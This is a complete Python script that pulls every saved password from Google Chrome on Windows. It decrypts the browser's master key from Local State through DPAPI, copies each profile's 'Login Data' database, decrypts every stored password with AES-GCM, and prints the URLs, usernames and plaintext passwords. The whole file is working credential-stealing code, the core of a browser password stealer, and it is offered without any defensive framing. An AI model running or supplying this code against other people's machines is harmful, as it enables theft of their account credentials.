import os
import json
import base64
import sqlite3
import shutil
import win32crypt
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend


def get_chrome_encrypted_key():
    home_path = os.path.expanduser("~")
    local_state_path = os.path.join(
        home_path, "AppData", "Local", "Google", "Chrome", "User Data", "Local State"
    )

    try:
        with open(local_state_path, "r", encoding="utf-8") as file:
            local_state_data = json.load(file)

        encrypted_key = local_state_data["os_crypt"]["encrypted_key"]
        # The key is base64 encoded, so we decode it
        encrypted_key = base64.b64decode(encrypted_key)
        # Remove the DPAPI prefix (DPAPI is the first 5 bytes)
        if encrypted_key[:5] == b"DPAPI":
            encrypted_key = encrypted_key[5:]
        else:
            print("Encrypted key does not start with 'DPAPI'")
            return None
        decrypted_key = win32crypt.CryptUnprotectData(
            encrypted_key, None, None, None, 0
        )[1]

        # Debugging: Print the decrypted key length
        print(f"Decrypted Key Length: {len(decrypted_key)}")
        return decrypted_key  # Decrypted key
    except Exception as e:
        print(f"Error extracting the encrypted key: {e}")
        return None


def decrypt_password(ciphertext, key):
    try:
        if ciphertext.startswith(b"v10") or ciphertext.startswith(b"v11"):
            # Remove 'v10' or 'v11' prefix
            ciphertext = ciphertext[3:]
        else:
            print("Ciphertext does not start with 'v10' or 'v11'")
            return None

        iv = ciphertext[:12]
        encrypted_password = ciphertext[12:-16]
        auth_tag = ciphertext[-16:]

        # Debugging: Print lengths of components
        print(
            f"IV Length: {len(iv)}, Encrypted Password Length: {len(encrypted_password)}, Auth Tag Length: {len(auth_tag)}"
        )

        cipher = Cipher(
            algorithms.AES(key), modes.GCM(iv, auth_tag), backend=default_backend()
        )
        decryptor = cipher.decryptor()
        decrypted_password = decryptor.update(encrypted_password) + decryptor.finalize()
        return decrypted_password.decode("utf-8")
    except Exception as e:
        print(f"Failed to decrypt password: {e}")
        return None


def fetch_chrome_passwords():
    key = get_chrome_encrypted_key()
    if not key:
        print("No encryption key found.")
        return

    home_path = os.path.expanduser("~")
    user_data_path = os.path.join(
        home_path,
        "AppData",
        "Local",
        "Google",
        "Chrome",
        "User Data",
    )

    # Find all profile folders
    profiles = [
        p
        for p in os.listdir(user_data_path)
        if os.path.isdir(os.path.join(user_data_path, p))
        and ("Profile" in p or p == "Default")
    ]

    for profile in profiles:
        chrome_path_login_db = os.path.join(user_data_path, profile, "Login Data")
        if not os.path.exists(chrome_path_login_db):
            continue

        print(f"Processing profile: {profile}")

        # Copy the database to the current directory
        shutil.copy2(chrome_path_login_db, "Loginvault.db")

        # Connect to the SQLite database
        conn = sqlite3.connect("Loginvault.db")
        cursor = conn.cursor()

        # Fetch the stored credentials from the database, using origin_url instead of action_url
        cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
        logins = cursor.fetchall()

        for index, login in enumerate(logins):
            url = login[0] or "(No URL)"  # Fetch from origin_url
            username = login[1] or "(No Username)"
            ciphertext = login[2]  # The encrypted password

            # Debugging: Print raw values
            print(
                f"Raw Data -> Url: {url}, Username: {username}, Encrypted Password: {ciphertext}"
            )

            if not url.strip() and not username.strip():
                continue  # Skip entries with empty URL and username

            # Decrypt the password using the key
            decrypted_password = decrypt_password(ciphertext, key)

            print(f"Url: {url}")
            print(f"Username: {username}")
            print(f"Decrypted Password: {decrypted_password}")

        # Close the connection
        cursor.close()
        conn.close()

        # Clean up by removing the copied database file
        os.remove("Loginvault.db")


if __name__ == "__main__":
    fetch_chrome_passwords()
